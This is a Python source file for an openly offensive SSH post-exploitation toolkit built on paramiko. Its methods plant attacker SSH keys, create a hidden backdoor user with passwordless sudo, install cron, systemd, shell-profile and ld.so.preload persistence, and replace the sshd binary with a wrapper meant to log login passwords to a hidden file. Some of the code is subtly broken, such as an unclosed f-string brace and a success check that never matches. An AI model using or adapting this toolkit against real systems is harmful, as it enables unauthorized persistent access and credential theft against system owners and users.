import os
import random
import string
from typing import Optional, Tuple
from paramiko import SSHClient

class SSHPersistence:
    """SSH persistence techniques for maintaining access"""
    
    def __init__(self, ssh_client: SSHClient):
        self.ssh = ssh_client
    
    def execute(self, command: str) -> Optional[str]:
        """Execute command and return output"""
        try:
            _, stdout, stderr = self.ssh.exec_command(command)
            return stdout.read().decode().strip()
        except Exception:
            return None
    
    def add_ssh_key(self, pub_key: str, authorized_keys: str = "~/.ssh/authorized_keys") -> bool:
        """Add SSH public key to authorized_keys"""
        try:
            # Ensure .ssh directory exists
            self.execute(f"mkdir -p ~/.ssh && chmod 700 ~/.ssh")
            
            # Add key to authorized_keys
            cmd = f"echo '{pub_key}' >> {authorized_keys} && chmod 600 {authorized_keys}"
            result = self.execute(cmd)
            return result is None  # Success if no error
        except Exception:
            return False
    
    def create_backdoor_user(self, username: str = None, password: str = None) -> Optional[Tuple[str, str]]:
        """Create a new user with sudo privileges"""
        try:
            # Generate random credentials if none provided
            if not username:
                username = 'sys' + ''.join(random.choices(string.digits, k=3))
            if not password:
                password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
                
            # Create user and set password
            self.execute(f"useradd -m -s /bin/bash {username}")
            self.execute(f"echo '{username}:{password}' | chpasswd")
            
            # Add to sudoers
            self.execute(f"echo '{username} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
            
            return (username, password)
        except Exception:
            return None
    
    def install_cron_persistence(self, command: str, interval: str = "@daily") -> bool:
        """Install persistence via cron job"""
        try:
            # Create random filename for cron job
            cron_file = f"/tmp/.{''.join(random.choices(string.ascii_lowercase, k=8))"
            
            # Write cron job
            self.execute(f"echo '{interval} {command}' > {cron_file}")
            
            # Install cron job
            self.execute(f"crontab {cron_file}")
            
            # Clean up
            self.execute(f"rm {cron_file}")
            
            return True
        except Exception:
            return False
    
    def install_systemd_persistence(self, service_name: str, command: str) -> bool:
        """Install persistence via systemd service"""
        try:
            # Create service file
            service_file = f"/etc/systemd/system/{service_name}.service"
            service_content = f"""[Unit]
Description={service_name}

[Service]
ExecStart={command}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"""
            
            # Write service file
            self.execute(f"echo '{service_content}' > {service_file}")
            
            # Enable and start service
            self.execute(f"systemctl enable {service_name} && systemctl start {service_name}")
            
            return True
        except Exception:
            return False
    
    def modify_shell_profile(self, command: str) -> bool:
        """Add command to shell profile files"""
        try:
            profile_files = [
                '~/.bashrc',
                '~/.bash_profile',
                '~/.zshrc',
                '~/.profile',
            ]
            
            for profile in profile_files:
                self.execute(f"echo '{command}' >> {profile}")
                
            return True
        except Exception:
            return False
    
    def install_ssh_wrapper(self) -> bool:
        """Install SSH wrapper to capture credentials"""
        try:
            # Backup original SSH binary
            self.execute("cp /usr/sbin/sshd /usr/sbin/sshd.bak")
            
            # Create wrapper script
            wrapper_script = """#!/bin/sh
echo "SSH Login: $USER@$(hostname) with password: $PASSWORD" >> /var/log/.ssh.log
exec /usr/sbin/sshd.bak "$@\""""
            
            # Install wrapper
            self.execute(f"echo '{wrapper_script}' > /usr/sbin/sshd")
            self.execute("chmod +x /usr/sbin/sshd")
            
            # Restart SSH service
            self.execute("systemctl restart sshd || service ssh restart")
            
            return True
        except Exception:
            return False
    
    def install_ld_preload(self, so_path: str = "/tmp/.lib.so") -> bool:
        """Install persistence via LD_PRELOAD"""
        try:
            # Simple shared object that hooks key functions
            so_content = """#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

void _init() {
    unsetenv("LD_PRELOAD");
    system("id > /tmp/.ld_preload_test");
}"""
            
            # Compile and install
            self.execute(f"echo '{so_content}' > /tmp/.lib.c")
            self.execute("gcc -fPIC -shared -o /tmp/.lib.so /tmp/.lib.c -ldl")
            self.execute("echo '/tmp/.lib.so' > /etc/ld.so.preload")
            
            return True
        except Exception:
            return False